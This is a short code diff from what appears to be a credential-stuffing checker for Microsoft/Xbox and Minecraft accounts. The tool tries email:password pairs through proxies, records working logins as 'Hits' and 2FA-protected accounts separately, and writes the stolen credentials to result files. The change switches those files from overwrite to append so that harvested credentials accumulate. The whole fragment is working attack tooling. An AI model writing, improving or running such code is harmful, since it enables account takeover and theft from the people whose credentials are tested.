@@ -51,7 +51,7 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag):
             if "protect your account" in login_request.text:
                 twofa+=1
                 if screen == "'2'": print(Fore.MAGENTA+f"2FA: {email}:{password}")
-                with open(f"results/2fa_{day}.txt", 'w') as file: file.write(f"{email}:{password}\n")
+                with open(f"results/2fa_{day}.txt", 'a') as file: file.write(f"{email}:{password}\n")
                 checked+=1
                 cpm+=1
                 return None
@@ -88,7 +88,7 @@ def authenticate(email, password, proxy):
                         mc = name(access_token, proxy)
                         if screen == "'2'": print(Fore.GREEN+f"Hit: {mc} | {email}:{password}")
                         hits+=1
-                        with open(f"results/Hits_{day}.txt", 'w') as file: file.write(f"{mc} | {email}:{password}\n")
+                        with open(f"results/Hits_{day}.txt", 'a') as file: file.write(f"{mc} | {email}:{password}\n")
     except:
         retries+=1
         threading.Thread(target=Checker, args=(email, password, proxylist)).start()
